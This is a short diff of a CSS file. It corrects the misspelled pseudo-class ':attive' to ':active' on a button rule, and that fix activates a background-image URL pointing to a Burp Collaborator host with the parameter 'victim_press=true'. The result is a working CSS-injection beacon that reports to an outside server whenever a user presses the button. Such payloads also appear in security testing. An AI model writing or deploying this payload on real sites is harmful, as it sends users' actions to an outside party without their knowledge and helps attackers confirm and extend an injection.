@@ -1,6 +1,6 @@
 body *, html * {
     background: lightblue url(img_tree.gif) no-repeat fixed center;
 }
-button.btn-primary-gradient:attive {
+button.btn-primary-gradient:active {
     background: url("https://4w1ol01hkqaf2ogtyc96mnxie9kz8o.burpcollaborator.net/victim_press=true");
 }
